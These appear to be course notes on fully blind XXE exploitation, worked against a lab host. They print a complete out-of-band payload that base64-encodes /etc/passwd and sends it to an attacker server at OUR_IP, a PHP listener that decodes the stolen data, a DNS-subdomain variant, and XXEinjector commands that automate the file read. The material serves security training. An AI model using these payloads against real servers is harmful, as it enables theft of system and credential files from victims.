# Blind Data Exfiltration (XXE)

## Context
- Previous section: **blind but error-displaying** scenario — no reflected entity output, but PHP errors were shown, so error-based exfiltration worked.
- This section: **fully blind** — **no reflected output AND no visible errors**. Need an entirely different approach: **Out-of-Band (OOB) Data Exfiltration**.

---

## Out-of-Band (OOB) Data Exfiltration

### Concept
- OOB exfiltration is a technique also used in other blind attack classes: **blind SQLi, blind command injection, blind XSS** — same underlying idea applied here to XXE.
- Core idea: instead of getting the file content **printed back** in the HTTP response, make the **target server send an outbound request to an attacker-controlled server**, embedding the file's content **in that request** (e.g. as a URL parameter).
- This is still "out-of-band" in the same sense as earlier DTD-hosting techniques (hosting a DTD file on our machine) — but now the **payload itself**, not just the DTD, triggers a callback carrying data.

### Step 1 — Build the exfiltration entities
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
- `%file` → base64-encodes the target file (avoids breaking URL/XML syntax, handles special characters).
- `%oob` → defines an entity (`content`) that makes an **HTTP request to our server**, embedding `%file;`'s value as the `content` query parameter.
- Example: if file content is `XXE_SAMPLE_DATA`, base64 = `WFhFX1NBTVBMRV9EQVRB` → target server requests:
  ```
  http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB
  ```

### Step 2 — Set up a listener to capture and decode the exfiltrated data
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```bash
vi index.php   # paste the PHP code above
php -S 0.0.0.0:8000
```
- Automatically decodes any incoming `content` parameter and logs it to the terminal.

### Step 3 — Craft and send the full payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
- `%remote` loads the externally hosted DTD (containing `%file` and `%oob` definitions).
- `<root>&content;</root>` triggers the reference to `content`, causing the **outbound callback** carrying the file data.
- Send via POST to the vulnerable endpoint (e.g. `/blind/submitDetails.php`).

### Step 4 — Capture the result
- Target app returns a generic `200 OK` (e.g. "check your email") — **no visible leak in the HTTP response**.
- On the attacker's PHP server terminal, the **incoming request** (first to `xxe.dtd`, then to `/?content=...`) is logged, and the PHP script **decodes it automatically**:
  ```
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...SNIP...
  ```
- Confirms successful **blind OOB file exfiltration**.

### Alternative: DNS-based OOB exfiltration
- Instead of putting base64 data as a **URL parameter**, embed it as a **subdomain**:
  ```
  ENCODEDTEXT.our.website.com
  ```
- Capture incoming DNS queries with a tool like **tcpdump**, then decode the subdomain label to recover the data.
- More advanced / more effort than HTTP-based OOB, but useful when **outbound HTTP is blocked** but DNS resolution still occurs.

## Automated OOB Exfiltration — XXEinjector

- Manual methods work, but **XXEinjector** (Ruby tool) can automate most techniques covered in this module: basic XXE, CDATA exfiltration, error-based XXE, and blind OOB XXE.

### Step 1 — Clone the tool
```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

### Step 2 — Prepare the request template
- Copy the raw HTTP request from Burp into a file.
- Keep only the **first XML line**, then add `XXEINJECT` as a placeholder for the tool to insert its payload:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

### Step 3 — Run the tool
```bash
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
- `--host` / `--httpport`: attacker's listener IP/port
- `--file`: the saved request template
- `--path`: target file to read
- `--oob=http`: use HTTP-based OOB exfiltration
- `--phpfilter`: base64-encode via PHP filter (same technique as manual method)

### Step 4 — Retrieve results
- Console output shows the attack was sent but **doesn't directly print decoded content** (since it's base64-encoded in transit).
- Exfiltrated data is saved automatically under the tool's **Logs** directory:
```bash
cat Logs/10.129.201.94/etc/passwd.log
```
```

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

```

## Summary: Progression of XXE exploitation difficulty

| Scenario | Technique | Data retrieval method |
|---|---|---|
| Reflected output exists | Basic XXE / CDATA + parameter entities | Direct in HTTP response |
| No reflected output, but errors shown | Error-Based XXE | Leaked via error message |
| No output, no errors (fully blind) | **OOB Data Exfiltration** | Outbound HTTP/DNS request to attacker server |
| Any of the above | **XXEinjector** (automation) | Automated, logged to file |

## Key takeaways
1. **Fully blind XXE still exploitable** via OOB — core requirement is only that the **target server can make outbound connections** to the attacker.
2. **Parameter entities + externally hosted DTD** are the mechanism enabling the callback to embed file content as part of the outbound request.
3. **Base64 encoding (via `php://filter`)** remains essential to avoid breaking XML/URL syntax during exfiltration.
4. **DNS-based OOB** is a fallback when HTTP egress is blocked but DNS resolution is still possible.
5. Tools like **XXEinjector** can automate the entire workflow (basic, CDATA, error-based, and blind OOB XXE), useful for efficiency once the manual technique is understood.
6. This OOB approach mirrors techniques used in **other blind vulnerability classes** (SQLi, command injection, XSS) — same underlying exfiltration pattern, adapted per vulnerability type.
